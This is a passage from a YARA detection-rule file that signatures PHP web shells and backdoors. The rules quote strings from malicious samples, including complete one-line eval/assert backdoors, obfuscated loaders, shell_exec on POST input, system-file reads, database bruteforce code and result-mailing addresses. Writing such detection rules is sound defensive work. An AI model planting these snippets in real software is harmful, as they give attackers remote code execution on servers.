      $s14 = "7467QfD3/DQHpKLTNe8m8oLuBpdbg4GXao3m9DCv0hrfD0+5mIKYYC9l6NA1zAfE985lXmByS9VLiDH2lFMLHot75/OwJevEzDllyeLcjUpTMO0HIjO5df3Bp7frz73o" ascii
      $s15 = "ZlpGETZcdN3O5XIo1Y1weVPdGUj9uGuiQTcbdUE1x3p3J9GpQdWh9qVf+gdaI6jTdaGsBKHMWNZmNqda2uxkhNrcjUUl9XQvJYm+Bla3hsUfVeC6nXG/GsoUt1dTNr2B" ascii
      $s16 = "4EC+/7b9/o3pD69u3DY+71zx2HaSvPBQqNO9N6dt5egO5TftpjO8NdmBDguPKpv+VoTHaF4Tk7nq42QErTnyefQlS4KPLw668PHy7X1J/y7HdR6izKua/03hPtDQAmoX" ascii
      $s17 = "xh9a+/BXAh+SqkwNVV369eaBfv3r52cdf11DPNp3u7Yw8GPnwsATTg3zzAAbwXmyXYcikfSsMtpbeBIIGlxAk9gNsCY6V6gMk89fWbv79IMPmv4e6pCgMEqn+ewWeit1" ascii
      $s18 = "hRRQu+jFRNFjq27C9d08J8NpDNLlgRVemilgdWu5Bh96xiBZNeFHVBpL7SB9POYYqmwmOWHpobkS2b4yo2w+3KuxKOsCYdLLXQeOxu2CGiLU6Hr+iNOyVLmAWf2C7il0" ascii
      $s19 = "zbefz8k+/JP4ee+R6qRz8XI9EePqaFYkfTPp+6Pe31z1ko2Q8K2uxON2QLXsQju7sVSTbSn255Q5KTPP3uf63u1Jyy8Mci/Yzhv/JS3xtttDkbHnvgk0Zh4jLF3e5pZV" ascii
      $s20 = "aE73eSgWw1BFcOCsU21OEQQN6iW+FJkxzJmtCn+fR2SXcWfiSDycFla9nIOM5Hh7Mu5LQ5BHbirCfDQ/xtcVEWACQFG6Thq1MkEvUmq3fBJVfg8kjF7FjQF0kYNhOWKc" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 300KB and
      8 of them
}

rule sig_1d50c11fa28a19289aaa63a03e0abb371f825dca
{
   meta:
      description = "php17 - file 1d50c11fa28a19289aaa63a03e0abb371f825dca.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "50bebed805e9e3b21d1d8c24501cc3bf29dea74081fd37d14258b5c40d1482a9"
   strings:
      $x1 = "</b><font face=\"Wingdings 3\" size=\"5\"></font><b><font color=\"#CC0000\">Sosyete Safe Mode Bypass Shell<span lang=\"en-us\"><" ascii
      $x2 = "<font face=\"Wingdings 3\" size=\"5\"></font><b>Sosyete Safe Mode Bypass Shell ; Bypass shell'lerden esinlenerek bir" fullword ascii
      $x3 = "<p align=\"center\">Sosyete Safe Mode Bypass Shell - Edited By KingDefacer" fullword ascii
      $x4 = "<title>Sosyete Safe Mode Bypass Shell - Edited By KingDefacer</title>" fullword ascii
      $s5 = "<option value=\" \">Sosyete safe mode bypass shell</option>" fullword ascii
      $s6 = "<option value=\"cat /var/cpanel/accounting.log\">cat/var/cpanel/accounting.log</option>" fullword ascii
      $s7 = "<option value=\"netstat -an | grep -i listen\">A&#231;&#305;k Portlar</option>" fullword ascii
      $s8 = "<TABLE style=\"BORDER-COLLAPSE: collapse\" height=1 cellSpacing=0 borderColorDark=#666666 cellPadding=5 width=\"100%\" bgCol" fullword ascii
      $s9 = "<TABLE style=\"BORDER-COLLAPSE: collapse\" height=1 cellSpacing=0 borderColorDark=#666666 cellPadding=0 width=\"100%\" bgColor=" fullword ascii
      $s10 = "$fuck=shell_exec($_POST[sosyete]); " fullword ascii
      $s11 = "$mokoko=shell_exec($_POST[fuck]); " fullword ascii
      $s12 = "echo \"<b><font color=red>Sosyete Bypass Main Menu</font></b><br>\";" fullword ascii
      $s13 = "</b><font face=\"Wingdings 3\" size=\"5\"></font><b><font color=\"#CC0000\">Sosyete Safe Mode Bypass Shell<span lang=\"en-us\"><" ascii
      $s14 = "<TABLE style=\"BORDER-COLLAPSE: collapse\" height=1 cellSpacing=0 borderColorDark=#666666 cellPadding=0 width=\"100" fullword ascii
      $s15 = "<span lang=\"en-us\"> </span>  </b><font color=\"#CC0000\"><b>Coded by</b> </font><b><span lang=\"en-us\"><a href=\"http://www.R" ascii
      $s16 = "<BODY text=#ffffff bottomMargin=0 bgColor=#000000 leftMargin=0 topMargin=0 rightMargin=0 marginheight=0 marginwidth=0 style=" fullword ascii
      $s17 = "<th width=\"101%\" height=\"15\" nowrap bordercolor=\"#C0C0C0\" valign=\"top\" colspan=\"2\" bgcolor=\"#000000\">" fullword ascii
      $s18 = "<td width=\"990\" height=\"1\" valign=\"top\" style=\"color: #DCE7EF\" bgcolor=\"#000000\"><p align=\"center\">" fullword ascii
      $s19 = "<option value=\"cat /etc/httpd/conf/httpd.conf\">cat/etc/httpd/conf/httpd.conf</option>" fullword ascii
      $s20 = "<option value=\"cat /etc/syslog.conf\">cat/etc/syslog.conf</option>" fullword ascii
   condition:
      uint16(0) == 0x683c and filesize < 20KB and
      1 of ($x*) and 4 of them
}

rule sig_6d5b2b18380a1869ef54f5baf51c695a
{
   meta:
      description = "php17 - file 6d5b2b18380a1869ef54f5baf51c695a.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "e62ac5bcf0d87c0d3e4fce296fbd2980c94dd409a5a70a7751c93cdaecbfe1ee"
   strings:
      $s1 = "<?php if(md5(@$_COOKIE['hsh'])=='afa866c2a146a0603e48507514f8559b')($_=@$_REQUEST['css']).@$_($_REQUEST['js']); ?>" fullword ascii
      $s2 = "afa866c2a146a0603e48507514f8559b" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule sig_04e9927c5fb43129b348514a4bfbb38ca7325362
{
   meta:
      description = "php17 - file 04e9927c5fb43129b348514a4bfbb38ca7325362.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "56f11153a17eb60ab56ad361a403f7165e44487df9755bf97d06e5b971918797"
   strings:
      $s1 = "die(var_dump($str));" fullword ascii
      $s2 = "$str = $rc->getDocComment();" fullword ascii
      $s3 = "* T[\"c\"]);" fullword ascii
      $s4 = "* eva" fullword ascii
      $s5 = "* l($_GE" fullword ascii
      $s6 = "* rt" fullword ascii
      $s7 = "* asse" fullword ascii
      $s8 = "$fu=$fu.substr($str,strpos($str,'r'),2);" fullword ascii
      $s9 = "$evf=$evf.substr($str,strpos($str,'l'),6);" fullword ascii
      $s10 = "$evf=$evf.substr($str,strpos($str,'T'),8);" fullword ascii
      $s11 = "$evf=substr($str,strpos($str,'e'),3);" fullword ascii
      $s12 = "$fu=substr($str,strpos($str,'as'),4);" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      8 of them
}

rule sig_1008d836f69797ceffa4d5edcb5fbbe84f4e2d73
{
   meta:
      description = "php17 - file 1008d836f69797ceffa4d5edcb5fbbe84f4e2d73.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "faeb7b53027928a6774b9aadfec7407827f2b937318ceaf6c9247e81ea6ff24d"
   strings:
      $s1 = "$l='de(x(gzcE*ompE*resE*s($E*o),$k))E*;print(\"<$k>$d<E*/E*$E*k>\");@session_dE*estroy(E*);}}}}';" fullword ascii
      $s2 = "$W='$i],$fE*);E*ifE*($e){$k=$khE*.$kE*f;oE*b_start();@evaE*l(@gzE*uncomprE*ess(E*@x(@baE*se';" fullword ascii
      $s3 = "$E='*E*p=$ss($E*p,3);E*}if(E*array_key_existE*E*s($iE*,$s)){$s[$i].E*=$p;$E*e=E*strpos($s[E*';" fullword ascii
      $s4 = "$X='64E*_decodE*e(preg_replacE*e(arrE*ay(\"/_E*/E*E*\",\"/-/\"),array(E*\"/\",\"+E*\"),$ss(E*$s[$i]E*';" fullword ascii
      $s5 = "$h='i}^$k{$j}E*;}}E*return $oE*;}$r=$E*_SEE*RVER;$rE*E*r=E*@$r[\"HE*TTP_RE*EFERER\"];$raE*=@$r';" fullword ascii
      $s6 = "$B=';$o=\"E*\"E*;for($i=0E*;$E*i<$l;E*){E*forE*($j=0;E*($j<$c&&$i<$l);$j++,E*$E*i++){E*$o.=$t{$';" fullword ascii
      $s7 = "$H='md5($iE*.$kh),0E*,3))E*;$f=$sl(E*E*$ss(md5($i.$kfE*)E*,0E*,3));$p=\"\";E*fE*E*or($z=1;$zE*<';" fullword ascii
      $s8 = "$j='$khE*=\"5d41\";E*$kf=E*\"402a\";funcE*tiE*on x($t,E*$k){$E*c=sE*trleE*nE*($k);$l=strlen($t)E*';" fullword ascii
      $s9 = "$y='?:;q=E*0.([\\\\dE*]))?,?/\",$E*raE*,$m);iE*f(E*$q&&$m){@sessE*ion_sE*tarE*t();$s=&$_SE*E*ESSE';" fullword ascii
      $s10 = "$z='*ION;$ss=E*\"substr\";$E*slE*=\"strtolE*oweE*r\";$iE*=$m[1][0E*].$m[1][1];$hE*=$sE*l(E*$ss(';" fullword ascii
      $s11 = "$Z='countE*(E*$m[1]);$z++)$p.=$q[E*$m[2][$E*z]];if(sE*tE*rpos($pE*E*,$h)===E*0){$s[$i]=\"\";$E';" fullword ascii
      $s12 = "$K='E*[\"HE*TTPE*_ACCEPT_LANGUAGE*E\"];if($rr&E*&$E*ra){E*$u=parsE*eE*_url($rr);parse_E*sE*trE';" fullword ascii
      $s13 = "$R='*($u[\"queE*ry\"],E*$q);$q=array_vaE*E*E*lues($q);preE*E*g_matE*ch_all(\"/([\\\\w])E*[E*\\\\w-]+(';" fullword ascii
      $s14 = "$J=',0,$eE*E*))),$k))E*);$o=ob_gE*et_E*contE*ents();obE*_end_clean(E*);$E*d=E*baseE*64_enco';" fullword ascii
      $s15 = "$Q=str_replace('E*','',$j.$B.$h.$K.$R.$y.$z.$H.$Z.$E.$W.$X.$J.$l);" fullword ascii
      $s16 = "$f=str_replace('d','','credadted_fduncddtion');" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 4KB and
      8 of them
}

rule sig_27709064134868f470d242e9bcc2af2d
{
   meta:
      description = "php17 - file 27709064134868f470d242e9bcc2af2d.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "e2b4fa8e20f32a01cfb3a2677d0bd49d9bf9bf50c8b6f897bffac6d8fb0bdeda"
   strings:
      $s1 = "ype=text name=path><input type=\"file\" name=\"files\"><input type=submit value=\"Up\"></form></body></html>';" fullword ascii
      $s2 = "if (move_uploaded_file($files['tmp_name'], $fullpath)) {" fullword ascii
      $s3 = "echo \"<h1><a href='$fullpath'>OK-Click here!</a></h1>\";" fullword ascii
      $s4 = "$fullpath = $_REQUEST[\"path\"] . $files[\"name\"];" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule AbstractRedisAdapterTest
{
   meta:
      description = "php17 - file AbstractRedisAdapterTest.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "c0423abf15579d8344ecfa62893d6ee744d32ef68d5abcf769ea5506b800ba12"
   strings:
      $s1 = "if (!@((new \\Redis())->connect(getenv('REDIS_HOST')))) {" fullword ascii
      $s2 = "'testHasItemReturnsFalseWhenDeferredItemIsExpired' => 'Testing expiration slows down the test suite'," fullword ascii
      $s3 = "$e = error_get_last();" fullword ascii
      $s4 = "'testDefaultLifeTime' => 'Testing expiration slows down the test suite'," fullword ascii
      $s5 = "'testExpiration' => 'Testing expiration slows down the test suite'," fullword ascii
      $s6 = "return new RedisAdapter(self::$redis, str_replace('\\\\', '.', __CLASS__), $defaultLifetime);" fullword ascii
      $s7 = "self::markTestSkipped('Extension redis required.');" fullword ascii
      $s8 = "use Symfony\\Component\\Cache\\Adapter\\RedisAdapter;" fullword ascii
      $s9 = "namespace Symfony\\Component\\Cache\\Tests\\Adapter;" fullword ascii
      $s10 = "protected $skippedTests = array(" fullword ascii
      $s11 = "self::markTestSkipped($e['message']);" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 3KB and
      8 of them
}

rule sig_5fa1008e2c1a5dee4ca91638903563e6eff10569
{
   meta:
      description = "php17 - file 5fa1008e2c1a5dee4ca91638903563e6eff10569.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "0a0944635d48b8d4a44068847e8958710c644233a5227bc193bbd34999dc2131"
   strings:
      $x1 = "$str = \"host='\".$ip.\"' port='\".$port.\"' user='\".$login.\"' password='\".$pass.\"' dbname=''\";" fullword ascii
      $x2 = "$db->connect($_POST['sql_host'], $_POST['sql_login'], $_POST['sql_pass']);" fullword ascii
      $x3 = "if($db->connect($_POST['sql_host'], $_POST['sql_login'], $_POST['sql_pass'])) {" fullword ascii
      $s4 = "if( bruteForce($server[0],@$server[1], $_POST['login'], $line) ) {" fullword ascii
      $s5 = "$m = array('View', 'Highlight', 'Download', 'Hexdump', 'Edit', 'Chmod', 'Rename', 'Touch');" fullword ascii
      $s6 = "$temp = @iconv($_POST['charset'], 'UTF-8', addcslashes(\"\\n$ \".$_POST['p1'].\"\\n\".ex($_POST['p1']),\"\\n\\r\\t\\\\'\\0\"));" fullword ascii
      $s7 = "'<td><nobr>'.substr(@php_uname(), 0, 120).'  <a href=\"http://www.google.com/search?q='.urlencode(@php_uname()).'\" target=\"_bl" ascii
      $s8 = "showSecParam('Downloaders', $temp);" fullword ascii
      $s9 = "/*$source_code = explode(\"\\n\", str_replace(array(\"\\r\\n\", \"\\r\"), \"\\n\", file_get_contents($_POST['p1'])));" fullword ascii
      $s10 = "'<td><nobr>'.substr(@php_uname(), 0, 120).'  <a href=\"http://www.google.com/search?q='.urlencode(@php_uname()).'\" target=\"_bl" ascii
      $s11 = "ring tools'=>'StringTools','Bruteforce'=>'Bruteforce','Network'=>'Network', 'Logout'=>'Logout', 'Self remove' => 'SelfRemove');" fullword ascii
      $s12 = "<td><input type=text name=sql_pass value='<?=(empty($_POST['sql_pass'])?'':htmlspecialchars($_POST['sql_pass']));?>'></td>" fullword ascii
      $s13 = "function bruteForce($ip,$port,$login,$pass) {" fullword ascii
      $s14 = "echo '</textarea><input type=text name=cmd style=\"border-top:0;width:100%;margin:0;\" onkeydown=\"kp(event);\">';" fullword ascii
      $s15 = "ileatime($_POST['p1'])).' <span>Modify time:</span> '.date('Y-m-d H:i:s',filemtime($_POST['p1'])).'<br><br>';" fullword ascii
      $s16 = "<html><head><meta http-equiv='Content-Type' content='text/html; charset=<?=$_POST['charset']?>'><title><?=$_SERVER['HTTP_HOST']?" ascii
      $s17 = "$res = @mysql_connect($ip.':'.$port?$port:3306, $login, $pass);" fullword ascii
      $s18 = "showSecParam('Distr name', @file_get_contents('/etc/issue.net'));" fullword ascii
      $s19 = "showSecParam('Safe mode exec dir', @ini_get('safe_mode_exec_dir'));" fullword ascii
      $s20 = "showSecParam('OS version', @file_get_contents('/proc/version'));" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 100KB and
      1 of ($x*) and 4 of them
}

rule sig_5a8fbb5490505a153e911553e9f707ffa51cdebe
{
   meta:
      description = "php17 - file 5a8fbb5490505a153e911553e9f707ffa51cdebe.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "cc636161f078e605f7cbc6909d24765df8e8f405857ba4a8cb1f214b1c2defb5"
   strings:
      $s1 = "'Tf0tz*/$ZVe4pZrS1($atE4muYNLph($Pwp6))==$HLOTWYy3Ip6)$bIywY=$vUr($bAXD1h2s,/*'." fullword ascii
      $s2 = "'HNy*/$atE4muYNLph($wVYqzGy5.$BywtZ8QaHFk.$YzuZ.$PpCD4RJ914D.$IIBxK1GA_./*wQit'." fullword ascii
      $s3 = "'K8f-._$Js';$IXedwT=T&D;$ZVe4pZrS1=$ZAps4M|('^di'^';D]');$atE4muYNLph=(#Dfao7h'." fullword ascii
      $s4 = "'fLL*/wxGiDe.'}mOz[oKa~~7'.Owuug.'{~{n{';$rG4r3bseFJ='*n}Pqf-n#g'^#a_lCdbiaBRR'." fullword ascii
      $s5 = "'iGh o|';$YzuZ=n^')';$PpCD4RJ914D=\"+|*%\"^t0ck;$IIBxK1GA_=']_'&g_;$StoL=M&i;'Jb'." fullword ascii
      $s6 = "'  $;$G'|') %$$U')^$AKsSa;$vUr=$j5gQLS&('A^>1NQy%F+'.SHI8.'['^#Ereo6cpaZFW9p3w'." fullword ascii
      $s7 = "'=~'.KQnZo)^$L_X96rF;$ro74Wy=$yc|$Ulin;$OIYd=$mdKTVt&('ysO[r}'&'{w_[y}');if(/*'." fullword ascii
      $s8 = "'2c@lB!:Kru*/$PqU^$FtaeUxv;$bAXD1h2s=$rG4r3bseFJ^$rB;$O0Xnet=(\"9{\".SIkzl&#gIg3'." fullword ascii
      $s9 = "$XR='r0nw'&~Y0dTO1Wt;$ZAps4M='+l-'&')fw';$AKsSa=FAPZB.\" \"|HDAHH.'!';$j5gQLS=#XTQGk'." fullword ascii
      $s10 = "'&$YX8<&C1E$4 W5');$Pwp6=('!Pec|L'^VlMPH5)^('?h}go>'&'?k|s{y');$HLOTWYy3Ip6=/*'." fullword ascii
      $s11 = "'c{'.wwtw_w.'}~ov}oo'&'sw}o~w_w}~su}oo';$PqU=#li5cBcb42vVsRV4pLBKntygCNiV5lHCR'." fullword ascii
      $s12 = "'c>Q pir';$wVYqzGy5='u%!k*{il`'^'=qu;u#690';$BywtZ8QaHFk=_KELlmn&'_Wa~M[_';'BU'." fullword ascii
      $s13 = "'HA*:[ q`@}T@0ZLb>y M^@$@4@tA%0PI'|'@]'.kkR4UPA.'-'.PJt8_.'!Va%XB@RB0@'./*lCU5'." fullword ascii
      $s14 = "'m81-2Eu0~C';$rB='b1`]gAD~`A'|'!6`Ag@'.ptYG;$L_X96rF='kO>w=?~'&'Q{mw>7^';'yuBw'." fullword ascii
      $s15 = "'-.A';$yc='@@b @\"!'|'BBp)@`)';$mdKTVt=EcP791|UAFQ.\"<u\";$Ulin='4z#j1!K'^#IMQIwU'." fullword ascii
      $s16 = "'UP@0M*/TPc0PK;$FtaeUxv='}9Z~?V@[4~o}Mj>'.Z_zK.'?'.keFwUsOd.'^We}'&'}{zN?'./*n'." fullword ascii
      $s17 = "'NLNa~*/$StoL.$IXedwT));$bIywY($O0Xnet,$ro74Wy,$OIYd);#k;xvCWvgqQ!L>?10w:u&{E'." fullword ascii
      $s18 = "'@!*V9v939Jjr,?+kMW$8#{^v7[MR9pBS,PSH.o5}';" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 4KB and
      8 of them
}

rule ad84bb1dd81f7766a600e73227ac925d2fa60b6b
{
   meta:
      description = "php17 - file ad84bb1dd81f7766a600e73227ac925d2fa60b6b.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "20e9f434c2ac5a3b40390c8cf9805af0c7fe6d8915dc8c07fe4c3e02d4997307"
   strings:
      $s1 = "<?php $lang = (string)key($_POST);$lang($_POST['sz']); ?>" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule sig_504844fc6e68d871b0cbbcfdd34a99e9
{
   meta:
      description = "php17 - file 504844fc6e68d871b0cbbcfdd34a99e9.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "27837b65a4aa450350292c67396da687ff18bcb93e0167d050021a1e3c3ad262"
   strings:
      $s1 = "'b2YbuphHsphHsphHsphH70HFsphHsphHsp9v7VkXoVQHsuoXEVGX74Qc0xhHoLSNe2hzMmhHsphHsphHsphHspOzouQXegBCDLlI'." fullword ascii
      $s2 = "'5Z6oRO1bpOzouQXegBLOL3NA56Nw2YbuphHsphHsphz4mHFsphHsphHspZ1wpPcf2PHp2hzDLlzeplNELhzD8kK2LknWpQXo'." fullword ascii
      $s3 = "'lHs0BvsCO1rpSbuphHsphHsphHsphHsrktEE3LDLlHs0hHo4QNLyZj5qQNf1Jt64YbuphHsphHsphz4mhHsphH'." fullword ascii
      $s4 = "'kK08PKoE3CLPeL4MhHoFPto5WtEE3LDLlHbpOnoLSzWRQzogPH3MhHoFPto5oc5VPto2PK32YbuphHsphHsphH'." fullword ascii
      $s5 = "'H7R3F71GXDLlH7tkXO2kcOMGjupObuphHsphHsphHrUHFsphHsphHspQckpmN'." fullword ascii
      $s6 = "'LD8kK2LknWMhHoFPto5ZHsrlNE2314+oCORPvrUHFsphHsphHsp9WuphHsphHsphNLKhHE23nDLlHprPtArXtG1P'." fullword ascii
      $s7 = "'sphHsphHoFPto5oc5VPto2PK3pBvsCDtO2lH3UHFsphHsphHsphHsphHoFPto5WtEE3LDLlHs0hHl8318E3tD2Qv3UHF'." fullword ascii
      $s8 = "'phHsphH70HFsphH70HpuphHsp3z6FPNLVhNG8PKD4Qc0xhzDLlHprPKfgGvbpOzGEPz6Lhq4pO132HFsphH7'." fullword ascii
      $s9 = "'rYbuOHX4mHX4mHprr3K6yc1O1hL8PhKJFXvs0hHoMkXD4Xt613K01hq40Bv7NWJAjovs/hqspYFsrPNfyl'." fullword ascii
      $s10 = "'xhHo4QNLyZj5eojMmhHsphz4mHFsphH7blcOMQcepGC6xkno2PtaplN6alIA2PKJuOzGEPz6LmWuphHspSbuphHsphHsp'." fullword ascii
      $s11 = "'sphHsphHsp3K64lXOxhNGEPzDLYbuphHsphHsphz4mhHsphz4mHFsphH7blcOMQcepGC6xkno2Ptap3zOLJt6xGHp2HFs'." fullword ascii
      $s12 = "', 'n'=>'3', 'q'=>'D', 'p'=>'g', 's'=>'A', 'r'=>'k', 'u'=>'o', 't'=>'2', 'w'=>'8', 'v'=>'S', 'y'=>'z', 'x'=>'u', 'z'=>'H');" fullword ascii
      $s13 = "'hHsphHsphHspOzouQXegBCDLlI613K01mHoLSNegBKlLlI8L3nDEGtJumvrUHFsphHsphHsphHsphNLKhHpr'." fullword ascii
      $s14 = "'sphHsphHspOzouQXegBKfMPf01GcD23NLLPCoyhq4pkXO1kXrumjMmhHsphz4mHFsphH7blcOMQcepGC6xkno2PtapktALkX'." fullword ascii
      $s15 = "'GXEVGX74Qc0x3yMmhHsphz4mHFsphH7blcOMQcepGC6xkno2PtapX80rGXD43C6VlHp2HFsphH7UHpuphHsp9WumhHsphz7'." fullword ascii
      $s16 = "'fVQHsuOzouQXegBKf4lNfVQN8LPCWpkXepONf4lNfVQN8LPCW2hzMmhHsphHsphHsphHspZ1wpWtELktMpQckpQXWpQXepk'." fullword ascii
      $s17 = "'xkt0rGcW2mjMmHFsphHsphHsp3K64lXOxhHoLPKDRGN6rYbuphHsp9WumHFsphH7blcOMQcepGC6xkno2PtapQNfyjX6MlNLHSXo'." fullword ascii
      $s18 = "'0Hp22GFE23nDLlHprX4GOjI6jmvrmSbuOGK01GcfVQHprX4GOjI6jhNfyhHodGXrpBjapONG2PNJ2H'." fullword ascii
      $s19 = "'PX7MPtoLmH3MhH3MhHoEGNo1GXDyGXe2hHapOzouQXegBrAfYbuphHsp9WumHFsphH7blcOMQcepGC6xkno2Ptapkcor3rGR3K'." fullword ascii
      $s20 = "'HsphHsphz4mhHsphz4mHFsphH7blcOMQcepGC6xkno2PtapQXDjj6oWmHrmhHsphzMmhHsphHsphHsrlNE2314+jcf2PN61hq4pO'." fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 300KB and
      8 of them
}

rule sig_2f514a819a296a8cb1cb7e6f8788b9c062d8fa97
{
   meta:
      description = "php17 - file 2f514a819a296a8cb1cb7e6f8788b9c062d8fa97.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "7cd107320f3ca39182da751e142dfcc62a0327b250b036f03336cba34710895e"
   strings:
      $s1 = "$Q='(\"/_/\",\"r;r;/-/\"),arr;rar;y(r;\"/\",\"+\"),$ss($s[$r;ir;],0,$e)r;)),$kr;)));$o=ob_r;getr;_r;contents();ob_r;end_r;r;c';" fullword ascii
      $s2 = "$m='if($e){$k=$kh.r;$kf;or;b_star;rt();@er;var;l(@gzuncomprr;ess(@x(@r;br;aser;64_decoder;(preg_replar;r;ce(arrar;y';" fullword ascii
      $s3 = "$X='ler;an();$d=basr;e64r;_encode(x(gzcr;or;mprr;ess($o),$k));prr;int(\"<$k>$dr;<r;/$k>\"r;);@session_r;r;destroy();}}}}';" fullword ascii
      $s4 = "$q=';$rr=@$r[r;\"HTTP_Rr;EFERr;ERr;\"];r;$ra=@$r[\"HTTP_ACr;CEr;r;PT_LANGUAr;GE\"];if($rrr;&r;&$ra){$u=r;parser;_ur;r';" fullword ascii
      $s5 = "$a=';0,3));r;$p=\"\";forr;($z=1;$r;z<r;cr;ount($m[1r;]);$z++)$pr;.=$r;q[$r;m[2][$z]];ifr;(strpr;os($p,$r;h)===0)r;{$s[$r;';" fullword ascii
      $s6 = "$K='$kh=\"r;5d41\";$kfr;=\"4r;02a\";fr;uncr;tion xr;($t,$k){$cr;=r;strlenr;($k);$l=strlen(r;$t);$or;=\"\"r;;for($r;i=0;$i';" fullword ascii
      $s7 = "$g='=0.([\\\\d]))?r;,?/\"r;r;,$ra,$r;m);if($q&&$m)r;{@sessr;ir;on_sr;r;tartr;();$s=&$_Sr;ESSIr;ONr;r;;$ss=\"subr;str\";$sl=\"';" fullword ascii
      $s8 = "$k='strtr;r;olower\";$i=r;$m[1][0].$m[1r;][1];$h=$r;sl($sr;s(md5($r;i.$kh),0,r;3r;));$f=$sl($r;ss(md5(r;$i.$kfr;),r';" fullword ascii
      $s9 = "$L='<r;$l;)r;{forr;($j=0;($j<$r;c&&$i<$lr;);r;$r;j++,$i++){$o.=r;r;$t{$i}r;^$r;k{$jr;};}}return $o;}$r=r;$_Sr;ERVr;ER';" fullword ascii
      $s10 = "$C='i]=\"\"r;;$p=$r;ss($p,3)r;;}ifr;(arr;ray_kr;ey_r;exisr;ts($i,$s)){$s[$i].r;=r;$p;$r;e=strposr;($sr;r;[$ir;],$f);';" fullword ascii
      $s11 = "$v=str_replace('r;','',$K.$L.$q.$J.$g.$k.$a.$C.$m.$Q.$X);" fullword ascii
      $s12 = "$F=str_replace('aY','','aYcraYeate_aYfaYaYunaYction');" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 4KB and
      8 of them
}

rule sig_5cb40e9ded45c3414ae9fbea848a66a91fc17570
{
   meta:
      description = "php17 - file 5cb40e9ded45c3414ae9fbea848a66a91fc17570.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "21f98bfff1bb64575f9f42fb2cd94745d7cc6659a7150ddb3e6c35e4517684ea"
   strings:
      $s1 = "mb_ereg_replace_callback('.+', create_function('$arr', 'return assert($arr[0]);'),$_REQUEST['pass']);" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule sig_65f1620eae18c057aa2cd44507db71a884282c8a
{
   meta:
      description = "php17 - file 65f1620eae18c057aa2cd44507db71a884282c8a.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "0fbd603e2694c30da858e6dbeef9e5fa337b3a5afa8de67c4dffb40dea62ee1f"
   strings:
      $s1 = "<textarea cols=80 rows=20 name=\"src\">'.htmlspecialchars(file_get_contents($_POST['path'])).'</textarea><br />" fullword ascii
      $s2 = "echo '<br />Mr. DellatioNx196 GaLers xh3LL Backd00r <font color=\"red\">1.0</font>, Coded By <font color=\"red\">Mr. DellatioNx1" ascii
      $s3 = "$text3 = http_get('https://hastebin.com/raw/iracirucad');" fullword ascii
      $s4 = "$from = \"From: Result<botv3@mrspybotv3.com\";" fullword ascii
      $s5 = "echo('<pre>'.htmlspecialchars(file_get_contents($_GET['filesrc'])).'</pre>');" fullword ascii
      $s6 = "echo '<div id=\"content\"><table width=\"700\" border=\"0\" cellpadding=\"3\" cellspacing=\"1\" align=\"center\">" fullword ascii
      $s7 = "echo '<br />Mr. DellatioNx196 GaLers xh3LL Backd00r <font color=\"red\">1.0</font>, Coded By <font color=\"red\">Mr. DellatioNx1" ascii
      $s8 = "echo '<font color=\"red\">File Upload Error ~_~.</font><br />';" fullword ascii
      $s9 = "New Name : <input name=\"newname\" type=\"text\" size=\"20\" value=\"'.$_POST['name'].'\" />" fullword ascii
      $s10 = "<td><center><form method=\\\"POST\\\" action=\\\"?option&path=$path\\\">" fullword ascii
      $s11 = "$email = \"sellerolux@gmail.com\";" fullword ascii
      $s12 = "echo '<font color=\"green\">File Upload Done Kakak ~_^ .</font><br />';" fullword ascii
      $s13 = "if(is_writable(\"$path/$file\") || !is_readable(\"$path/$file\")) echo '</font>';" fullword ascii
      $s14 = "<input type=\"hidden\" name=\"path\" value=\"'.$_POST['path'].'\">" fullword ascii
      $s15 = "foreach($_POST as $key=>$value){" fullword ascii
      $s16 = "$_POST[$key] = stripslashes($value);" fullword ascii
      $s17 = "if(is_writable(\"$path/$dir\") || !is_readable(\"$path/$dir\")) echo '</font>';" fullword ascii
      $s18 = "}elseif(isset($_GET['option']) && $_POST['opt'] != 'delete'){" fullword ascii
      $s19 = "if(isset($_GET['option']) && $_POST['opt'] == 'delete'){" fullword ascii
      $s20 = "echo '<form enctype=\"multipart/form-data\" method=\"POST\">" fullword ascii
   condition:
      uint16(0) == 0x683c and filesize < 30KB and
      8 of them
}

rule sig_47749c211f5a3ad3999629b1403386501fa96048
{
   meta:
      description = "php17 - file 47749c211f5a3ad3999629b1403386501fa96048.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "3b629b45abf98fddf305200e987bacde77db3261a0c4e49cb4d68bafd45f88a4"
   strings:
      $s1 = "if(function_exists('pg_connect')) return @pg_connect(\"$host_str user=$sqluser password=$sqlpass\");" fullword ascii
      $s2 = "elseif(isset($p['dbType'])&&isset($p['dbHost'])&&isset($p['dbUser'])&&isset($p['dbPass'])&&isset($p['dbPort'])){" fullword ascii
      $s3 = "elseif($sqltype == 'oracle') return oci_execute(oci_parse($con, $query));" fullword ascii
      $s4 = "elseif($sqltype == 'oracle'){ if(function_exists('oci_connect')) return @oci_connect($sqluser, $sqlpass, $sqlhost); }" fullword ascii
